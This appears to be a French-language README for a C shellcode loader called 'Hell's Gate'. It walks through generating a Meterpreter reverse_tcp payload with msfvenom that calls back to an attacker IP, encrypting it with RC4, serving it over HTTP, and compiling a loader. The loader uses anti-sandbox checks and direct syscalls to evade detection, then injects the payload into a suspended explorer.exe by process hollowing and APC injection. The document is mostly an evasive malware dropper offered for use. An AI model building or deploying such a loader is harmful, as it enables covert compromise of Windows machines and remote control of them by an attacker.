# Loader C - Hell's Gate

Port en C du dropper NIM. Télécharge un payload RC4 via HTTP, le déchiffre en mémoire et l'injecte dans un processus suspendu via syscalls directs.

## Structure

```
main.c          Orchestrateur
rc4.h/.c        Chiffrement RC4 (symétrique, in-place)
sandbox.h/.c    Anti-sandbox (RAM < 1 Go = exit)
hellsgate.h/.c  Extraction syscall numbers + stubs ASM
http.h/.c       Téléchargement WinHTTP
inject.h/.c     Process hollowing + APC injection
encode2rc4.c    Outil d'encodage RC4 standalone
```

## Prérequis

```bash
sudo apt install gcc-mingw-w64-x86-64 make
```

## Compilation

```bash
make                    # loader.exe + encode2rc4.exe (Windows)
make encode2rc4-linux   # encoder natif Linux
make release            # loader optimisé (-Os -s)
make clean              # nettoyage build/
```

## Utilisation

### 1 - Générer un shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o payload.bin
```

### 2 - Chiffrer avec RC4

```bash
./build/encode2rc4-linux kernel32.dll payload.bin payload.enc
```

### 3 - Servir le payload

```bash
python3 -m http.server 8080
```

### 4 - Configurer et compiler

Modifier les constantes dans `main.c` :

```c
#define PAYLOAD_URL "http://10.10.14.5:8080/payload.enc"
#define RC4_KEY     "kernel32.dll"
```

```bash
make release
```

### 5 - Exécuter

Transférer `build/loader.exe` sur la cible Windows. Le loader :

1. Vérifie RAM > 1 Go (anti-sandbox)
2. Télécharge le payload chiffré
3. Déchiffre RC4 en mémoire
4. Lance `explorer.exe` suspendu
5. Injecte via syscalls directs (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtQueueApcThread)
6. Resume le thread

## Test RC4 round-trip

```bash
echo "test" > /tmp/a.bin
./build/encode2rc4-linux mykey /tmp/a.bin /tmp/b.bin
./build/encode2rc4-linux mykey /tmp/b.bin /tmp/c.bin
diff /tmp/a.bin /tmp/c.bin  # pas de sortie = OK
```

## API

| Module | Fonction | Description |
|---|---|---|
| rc4 | `rc4_crypt(key, key_len, data, data_len)` | Chiffre/déchiffre en place |
| sandbox | `sandbox_check()` | `TRUE` si RAM >= 1 Go |
| hellsgate | `get_syscall_number(func_name)` | Extrait le SSN depuis ntdll |
| hellsgate | `create_syscall_stub(ssn)` | Stub RWX 12 octets |
| http | `http_download(url, &data, &len)` | Download HTTP/HTTPS, buffer à `free()` |
| inject | `inject_shellcode(buf, len)` | Injection complète (create + alloc + write + APC) |
